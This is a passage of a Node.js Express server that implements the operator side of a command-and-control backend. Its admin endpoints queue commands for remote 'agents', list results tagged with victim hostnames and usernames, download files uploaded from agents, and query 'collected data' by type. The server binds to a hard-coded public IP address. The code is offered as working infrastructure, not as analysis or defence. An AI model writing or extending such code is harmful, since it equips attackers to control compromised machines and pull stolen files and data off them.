    if (!agent_id || !command_type || !command_data) {
      return res.status(400).json({ error: "Agent ID, command type, and command data are required" });
    }
    
    console.log(`Creating command for agent ${agent_id}: ${command_type}`);
    const [result] = await pool.query(`
      INSERT INTO c2_commands (agent_id, command_type, command_data)
      VALUES (?, ?, ?)
    `, [agent_id, command_type, command_data]);
    
    res.json({ success: true, command_id: result.insertId });
  } catch (err) {
    console.error("Error creating command:", err);
    res.status(500).json({ error: "Internal server error", details: err.message });
  }
});

// Admin: Get command results
app.get('/api/admin/c2/results', authenticateAdmin, async (req, res) => {
  if (!dbReady) {
    console.error('Database not ready for results endpoint');
    return res.status(503).json({ error: "Database not available" });
  }
  
  try {
    console.log('Fetching results from database...');
    const [results] = await pool.query(`
      SELECT r.*, c.command_type, c.command_data, a.hostname, a.username
      FROM c2_results r
      LEFT JOIN c2_commands c ON r.command_id = c.id
      LEFT JOIN c2_agents a ON r.agent_id = a.agent_id
      ORDER BY r.created_at DESC
      LIMIT 100
    `);
    
    console.log(`Found ${results.length} results`);
    res.json(results);
  } catch (err) {
    console.error("Error fetching results:", err);
    res.status(500).json({ error: "Internal server error", details: err.message });
  }
});

// Admin: Get agent details with commands
app.get('/api/admin/c2/agent/:agent_id', authenticateAdmin, async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id } = req.params;
    
    const [agent] = await pool.query('SELECT * FROM c2_agents WHERE agent_id = ?', [agent_id]);
    const [commands] = await pool.query(`
      SELECT * FROM c2_commands 
      WHERE agent_id = ? 
      ORDER BY created_at DESC
    `, [agent_id]);
    
    if (agent.length === 0) {
      return res.status(404).json({ error: "Agent not found" });
    }
    
    res.json({ agent: agent[0], commands });
  } catch (err) {
    console.error("Error fetching agent details:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Admin: Download uploaded files
app.get('/api/admin/c2/download/:agent_id/:filename', authenticateAdmin, async (req, res) => {
  try {
    const { agent_id, filename } = req.params;
    const filePath = path.join(process.cwd(), 'uploads', 'c2', agent_id, filename);
    
    const fs = await import('fs');
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "File not found" });
    }
    
    res.download(filePath);
  } catch (err) {
    console.error("Error downloading file:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Admin: Get collected data by type
app.get('/api/admin/c2/data/:agent_id/:data_type', authenticateAdmin, async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id, data_type } = req.params;
    
    const [results] = await pool.query(`
      SELECT * FROM c2_results 
      WHERE agent_id = ? AND result_data LIKE ?
      ORDER BY created_at DESC
    `, [agent_id, `%"type":"${data_type}"%`]);
    
    res.json(results);
  } catch (err) {
    console.error("Error fetching data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// --- Start Server ---
async function startServer() {
  try {
    await initDatabase();
    app.listen(PORT, () => {
      console.log(`Server running at http://150.136.130.59:${PORT}`);
      console.log(`Database status: ${dbReady ? 'Connected' : 'Failed'}`);
    });
  } catch (error) {
    console.error('Could not start server. Please check database credentials and connectivity.');
    process.exit(1);
  }
}

startServer();

// --- Graceful Shutdown ---
process.on('SIGINT', async () => {
  console.log('SIGINT signal received: closing HTTP server and DB pool');
  if (pool) await pool.end();
  process.exit(0);
}); 